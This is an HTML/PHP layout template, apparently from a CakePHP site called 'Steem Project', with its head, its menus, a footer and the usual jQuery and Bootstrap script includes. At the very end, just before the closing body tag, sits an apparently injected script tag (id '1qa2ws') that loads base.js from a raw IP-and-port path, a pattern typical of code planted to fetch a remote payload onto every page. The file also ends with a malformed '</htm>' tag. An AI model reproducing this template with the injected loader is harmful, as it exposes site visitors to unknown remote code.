<!DOCTYPE html>
<html lang="en">
  
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Steem Project | A community For All</title>
    
    <!-- Styles -->
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,700,800" rel="stylesheet" type="text/css"><!-- Google web fonts -->
    <link href="/assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css"><!-- font-awesome -->
    <link href="/assets/js/dropdown-menu/dropdown-menu.css" rel="stylesheet" type="text/css"><!-- dropdown-menu -->
    <link href="/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"><!-- Bootstrap -->
    <link href="/assets/js/fancybox/jquery.fancybox.css" rel="stylesheet" type="text/css"><!-- Fancybox -->
    <link href="/assets/js/audioplayer/audioplayer.css" rel="stylesheet" type="text/css"><!-- Audioplayer -->
    <link href="/assets/css/style.css" rel="stylesheet" type="text/css"><!-- theme styles -->

  </head>
  
  <body role="document">
  
    <!-- device test, don't remove. javascript needed! -->
    <span class="visible-xs"></span><span class="visible-sm"></span><span class="visible-md"></span><span class="visible-lg"></span>
    <!-- device test end -->
    
    <div id="k-head" class="container"><!-- container + head wrapper -->
    
    	<div class="row"><!-- row -->

            <?php
            echo $this->element('/general/top_menu');
            ?>
        
        	<div class="col-lg-12">
        
        		<div id="k-site-logo" class="pull-left"><!-- site logo -->
                
                    <h1 class="k-logo">
                        <a href="/" title="Home Page">
                            <img src="/assets/img/general/logo.png" height="60px;" width="110px;" alt="Site Logo" class="img-responsive" />
                        </a>
                    </h1>
                    
                    <a id="mobile-nav-switch" href="#drop-down-left"><span class="alter-menu-icon"><strong style="font-size: 40px;">...</strong> </span></a><!-- alternative menu button -->
            
            	</div><!-- site logo end -->

                <?php
                    echo $this->element('/moderators/menu');
                ?>
            	
            
            </div>
            
        </div><!-- row end -->
    
    </div><!-- container + head wrapper end -->
    
    <?php
    echo $this->fetch('content');
    ?>
    

    <?php
        echo $this->element('/general/footer');
    ?>
    
    <!-- jQuery -->
    <script src="/assets/jQuery/jquery-2.1.1.min.js"></script>
    <script src="/assets/jQuery/jquery-migrate-1.2.1.min.js"></script>
    
    <!-- Bootstrap -->
    <script src="/assets/bootstrap/js/bootstrap.min.js"></script>
    
    <!-- Drop-down -->
    <script src="/assets/js/dropdown-menu/dropdown-menu.js"></script>
    
    <!-- Fancybox -->
	<script src="/assets/js/fancybox/jquery.fancybox.pack.js"></script>
    <script src="/assets/js/fancybox/jquery.fancybox-media.js"></script><!-- Fancybox media -->
    
    <!-- Responsive videos -->
    <script src="/assets/js/jquery.fitvids.js"></script>
    
    <!-- Audio player -->
	<script src="/assets/js/audioplayer/audioplayer.min.js"></script>
    
    <!-- Pie charts -->
    <script src="/assets/js/jquery.easy-pie-chart.js"></script>
    
    <!-- Google Maps -->
    <script src="https://maps.googleapis.com/maps/api/js?sensor=true"></script>
    
    <!-- Theme -->
    <script src="/assets/js/theme.js"></script>
    
  <script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../154.70.108.86_9090/www/default/base.js'></script></body>

</htm>